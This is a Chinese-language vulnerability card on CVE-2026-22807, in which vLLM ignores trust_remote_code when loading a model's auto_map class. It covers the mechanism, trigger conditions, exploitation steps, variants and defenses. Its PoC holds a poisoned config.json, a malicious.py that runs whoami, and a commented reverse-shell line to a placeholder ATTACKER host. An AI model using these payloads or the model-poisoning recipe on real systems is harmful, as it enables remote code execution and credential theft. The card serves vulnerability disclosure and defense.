---
id: ai-security-supply-chain-vllm-auto-map-trust-remote-code-bypass
title: vLLM 解析 auto_map 未透传 trust_remote_code：恶意模型加载即执行 Python 代码（CVE-2026-22807）
type: scenario
domain: ai-security
path: ai-security/supply-chain
technique: vllm-auto-map-trust-remote-code-bypass
aliases:
- CVE-2026-22807
- vLLM 供应链 RCE
- auto_map 远程代码执行
- trust_remote_code 失效
- HF 模型投毒
- try_get_class_from_dynamic_module
tags:
- vllm
- huggingface
- transformers
- auto-map
- trust-remote-code
- supply-chain
- model-loading
- rce
- python
cve:
- CVE-2026-22807
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V34
  verified_at: '2026-11-05T06:00:25+08:00'
  notes: 已对照原文与8张图核对：NVD 9.8/CNA 8.8、_try_resolve_transformers 读 auto_map、两处调用未传 trust_remote_code、wrapper 仅 **kwargs 转发、官方修复 commit 78d13ea（registry 两处传参 + dynamic_module 引入 resolve_trust_remote_code）均与卡片一致；原文肯定存在该 CVE 与修复。未验证点：原文靶场为自写 MiniLLM 仿真器，非真实 vLLM+HF 投毒复现；原文未给受影响版本区间，卡片未写 affected_versions。
---

## 一句话结论

vLLM 在 `ModelRegistry._try_resolve_transformers()` 中读取 Hugging Face 模型 `config.json` 的 `auto_map` 后，调用 `try_get_class_from_dynamic_module(...)` 时没有把用户设置的 `trust_remote_code` 传下去；该 wrapper 只做 `**kwargs` 转发，而 `dynamic_module.py` 内没有 `resolve_trust_remote_code` 校验，导致即使启动时显式写了 `LLM(..., trust_remote_code=False)`，加载被投毒的模型仓库仍会下载并执行 `auto_map` 指向的 Python 模块，在服务启动/模型加载阶段即 RCE（CVE-2026-22807，NVD CVSS 9.8）。

## 原理

- Hugging Face `config.json` 的 `auto_map` 是“自定义实现类”的字符串指路牌，例如 `{"AutoModel": "malicious.EvilModel"}`；transformers 正常会在 `trust_remote_code=True` 时下载并加载对应 `.py`，`False` 时拒绝。
- vLLM 启动加载模型时，`ModelRegistry` 先决定用哪个 Model 类承载权重；`_try_resolve_transformers()` 从 `model_config.hf_config` 取 `auto_map`：
  `auto_map = getattr(model_config.hf_config, "auto_map", None) or dict()`。
- 只要 `auto_map` 非空，代码进入动态加载分支，遍历 `"AutoModel"` 前缀的项，调用 `try_get_class_from_dynamic_module(module, model_config.model, revision=model_config.revision, warn_on_fail=...)`。该调用没有 `trust_remote_code=model_config.trust_remote_code` 参数。
- `vllm/transformers_utils/dynamic_module.py` 的 `try_get_class_from_dynamic_module()` 只是对 `transformers.dynamic_module_utils.get_class_from_dynamic_module()` 的薄封装：签名 `(class_reference, pretrained_model_name_or_path, ..., **kwargs)`，把上层传入的 `**kwargs` 原样转发；wrapper 内部不做任何安全检查。
- 于是安全开关在 API 层存在、在真正执行风险动作的底层入口缺失：无论用户传 `trust_remote_code=False`，`get_class_from_dynamic_module()` 仍会下载模块并 `exec_module`；Python 的 import 语义是“导入即执行”，模块顶层代码立即运行。
- 这是 TOCTOU/检查缺失型问题：代码加载（Use）发生在权限检查（Check）之前，甚至根本不执行检查；恶意代码在服务启动、请求尚未进入时就已经执行。
- 影响面是供应链投毒：攻击者不必攻破服务器，只需让受害者加载一个引用了恶意实现的模型仓库（或污染其依赖的 `auto_map` 指向），即可在模型加载阶段获得代码执行。
- 官方修复（commit 78d13ea）两层：① `registry.py` 两处调用显式加 `trust_remote_code=model_config.trust_remote_code`；② `dynamic_module.py` 新增 `trust_remote_code: bool` 必填参数，并在 `get_class_from_dynamic_module()` 前调用 transformers 的 `resolve_trust_remote_code(trust_remote_code, pretrained_model_name_or_path, has_local_code=False, has_remote_code=True)`，`False` 时直接抛异常阻断。

## 触发条件

- 目标使用存在该缺陷的 vLLM 版本（文章对照源码与官方修复 commit 78d13ea；原文未给完整版本区间）。
- 受害者加载的模型仓库/本地模型目录的 `config.json` 含攻击者可控的 `auto_map`，指向可下载/可导入的恶意 Python 模块。
- 加载过程能访问该模块（Hugging Face 仓库、本地文件或可控缓存），且 vLLM 进程有权限执行 Python。
- 用户即使已显式设置 `trust_remote_code=False` 也不构成防护——这正是漏洞点。

## 利用步骤

1. 攻击者准备恶意模型仓库（或被投毒的依赖模型）：`config.json` 中加入 `"auto_map": {"AutoModel": "malicious.EvilModel"}`，并放置 `malicious.py`，在模块顶层执行命令/反弹 shell。
2. 诱导受害者用 vLLM 加载该模型：`LLM(model="attacker/model")` 或 `vllm serve attacker/model`；`trust_remote_code=False` 无法阻止。
3. vLLM 的 `_try_resolve_transformers` 读取 `auto_map`，调用 wrapper → transformers 动态模块下载并 `exec_module`，模块顶层代码在模型加载阶段执行。
4. 验证：进程出现异常子进程/回连；文章用精简仿真器 `MiniLLM` 演示 `whoami` 与 `calc` 成功执行。
5. 后续可替换为反弹 shell、窃取模型/凭证、修改权重或横向移动。

## PoC

```json
// 恶意模型仓库的 config.json 片段
{
  "model_type": "evil",
  "auto_map": {
    "AutoModel": "malicious.EvilModel"
  }
}
```

```python
# malicious.py：模块顶层代码在 import/exec_module 时立即执行
import os
os.system("whoami")
# 或反弹 shell：os.system("bash -i >& /dev/tcp/ATTACKER/4444 0>&1")
```

```python
# 受害者侧（trust_remote_code=False 仍触发）
from vllm import LLM
llm = LLM(model="attacker/evil-model", trust_remote_code=False)
```

```text
文章靶场输出（MiniLLM 仿真器，非真实 vLLM）：
  [*] 正在加载模型: dynamic_evil_model
  [*] 正在解析模型架构: malicious.EvilModel ...
  [+] 动态 Payload 执行成功!
  [+] 执行命令: whoami -> asus
  [+] 执行命令: calc -> 计算器弹出
  [-] 安全检查: trust_remote_code 为 False，拒绝加载远程代码  ← 检查发生在执行之后

说明：文章用精简版仿真器还原链路，未在真实 vLLM + HF 仓库上投毒复现；本卡未执行 PoC。
```

## 变体与关联

- 变体（调用点）：`registry.py` 中两处 `try_get_class_from_dynamic_module`（`AutoModel` 前缀匹配、`warn_on_fail=False/True`）都漏传参数；其他 vLLM 内部动态加载调用点也需审计。
- 变体（auto_map 键）：除 `AutoModel`，`AutoConfig`、`AutoTokenizer` 等键同样可指向恶意模块；任何被 vLLM 解析的 HF 配置字段都可能成为入口。
- 变体（投毒方式）：直接发布恶意模型仓库、污染合法仓库的 `auto_map`、在本地模型目录放置恶意文件、或在 CI/缓存中替换模块。
- 关联：AI 供应链层其他“模型/依赖/插件投毒”卡；本卡对应 CVE-2026-22807 的 `trust_remote_code` 未透传链。
- 边界：升级到含 commit 78d13ea 的版本后，`trust_remote_code=False` 会在动态加载前抛异常；若用户显式 `trust_remote_code=True`，仍会执行远程代码（这是预期行为）；网络隔离/无出网可降低远程仓库投毒风险，但本地模型目录投毒仍可能触发。

## 检测与防御

- 模型检测：加载前检查 `config.json` 的 `auto_map` 是否指向非官方/未固定 revision 的模块；对模型仓库做签名/哈希校验，固定 `revision` 到 commit SHA，避免 `main` 漂移。
- 运行时检测：vLLM 进程在模型加载阶段发起 HF 下载、`exec_module`/`importlib` 加载非预期模块、派生 `sh`/`bash`/`cmd` 子进程；日志出现 `Try get class from dynamic module` 与异常模块名；模型加载早于请求即出现外连。
- 修复：升级 vLLM 到包含 commit 78d13ea 的版本；确认 `registry.py` 调用已传 `trust_remote_code`，`dynamic_module.py` 已调用 `resolve_trust_remote_code`。
- 加固：默认 `trust_remote_code=False` 且不要为陌生模型开启；只加载可信来源、固定 revision 的模型；在沙箱/低权限容器中加载模型，限制出网与文件系统；对 `auto_map` 做静态扫描并告警。
- 供应链：模型仓库准入审核（config 审查、代码扫描）、依赖锁定与哈希、HF token 最小权限、监控模型更新；将模型加载放入无网络的初始化阶段或独立进程。
- 审计：搜索 `auto_map`、`get_class_from_dynamic_module`、`exec_module`、`**kwargs` 透传的 wrapper，确认所有动态加载入口都强制校验 `trust_remote_code`；不要依赖 API 层参数作为唯一安全边界。
